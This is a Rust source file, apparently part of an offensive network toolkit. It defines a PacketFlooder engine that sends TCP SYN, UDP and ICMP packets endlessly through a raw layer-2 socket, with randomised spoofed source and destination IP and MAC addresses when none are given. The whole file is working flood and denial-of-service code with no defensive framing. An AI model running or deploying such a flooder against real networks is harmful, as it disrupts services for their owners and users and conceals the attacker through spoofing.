
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::net::Ipv4Addr;
use crate::engines::FloodArgs;
use crate::generators::RandomValues;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{inline_display, get_first_and_last_ip};



pub struct PacketFlooder {
    args:      FloodArgs,
    pkts_sent: usize,
    rand:       RandomValues,
}


struct PktTools {
    builder: PacketBuilder,
    socket:  Layer2RawSocket
}


impl PacketFlooder {

    pub fn new(args: FloodArgs) -> Self {
        let (first_ip, last_ip) = get_first_and_last_ip(&args.iface);

        Self {
            args,
            pkts_sent: 0,
            rand:       RandomValues::new(Some(first_ip), Some(last_ip)),
        }
    }



    pub fn execute(&mut self){
        self.set_proto_flags();
        self.send_endlessly();
    }



    fn set_proto_flags(&mut self) {
        if !self.args.tcp && !self.args.udp && !self.args.icmp {
            self.args.tcp  = true;
            self.args.udp  = true; 
            self.args.icmp = true;
        }
    }



    fn setup_tools(iface: &str) -> PktTools {
        PktTools {
            builder: PacketBuilder::new(),
            socket:  Layer2RawSocket::new(&iface),
        }
    }



    fn send_endlessly(&mut self) {
        let mut tools = Self::setup_tools(&self.args.iface);
        let running   = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            let (src_port, src_ip, src_mac, dst_ip, dst_mac) = self.get_pkt_info();

            if self.args.tcp {
                Self::send_tcp(&mut tools, src_mac, src_ip, src_port, dst_mac, dst_ip);
                self.pkts_sent += 1;
            }

            if self.args.udp {
                Self::send_udp(&mut tools, src_mac, src_ip, src_port, dst_mac, dst_ip);
                self.pkts_sent += 1;
            }
        
            if self.args.icmp {
                Self::send_icmp(&mut tools, src_mac, src_ip, dst_mac, dst_ip);
                self.pkts_sent += 1;
            }
            
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
    }



    #[inline]
    fn get_pkt_info(&mut self) -> (u16, Ipv4Addr, [u8; 6], Ipv4Addr, [u8; 6]) {(
        self.rand.random_port(),
        self.args.src_ip.as_ref().unwrap_or( &self.rand.random_ip()).clone(),
        self.args.src_mac.as_ref().unwrap_or(&self.rand.random_mac()).clone(),
        self.args.dst_ip.as_ref().unwrap_or( &self.rand.random_ip()).clone(),
        self.args.dst_mac.as_ref().unwrap_or(&self.rand.random_mac()).clone()
    )}



    #[inline]
    fn send_tcp(
        tools:    &mut PktTools,
        src_mac:  [u8; 6],
        src_ip:   Ipv4Addr,
        src_port: u16,
        dst_mac:  [u8; 6],
        dst_ip:   Ipv4Addr
    ) {
        let tcp_pkt = tools.builder.tcp_ether(
            src_mac, src_ip, src_port,
            dst_mac, dst_ip, 80, "syn");
        tools.socket.send(tcp_pkt);
    }



    #[inline]
    fn send_udp(
        tools:    &mut PktTools,
        src_mac:  [u8; 6],
        src_ip:   Ipv4Addr,
        src_port: u16,
        dst_mac:  [u8; 6],
        dst_ip:   Ipv4Addr
    ) {
        let udp_pkt = tools.builder.udp_ether(
            src_mac, src_ip, src_port,
            dst_mac, dst_ip, 53,
            &[]
        );
        tools.socket.send(udp_pkt);
    }



    #[inline]
    fn send_icmp(
        tools:    &mut PktTools,
        src_mac:  [u8; 6],
        src_ip:   Ipv4Addr,
        dst_mac:  [u8; 6],
        dst_ip:   Ipv4Addr
    ) {
        let icmp_pkt = tools.builder.icmp_ping_ether(
            src_mac, src_ip,
            dst_mac, dst_ip
        );
        tools.socket.send(icmp_pkt);
    }

}



impl crate::EngineTrait for PacketFlooder {
    type Args = FloodArgs;
    
    fn new(args: Self::Args) -> Self {
        PacketFlooder::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}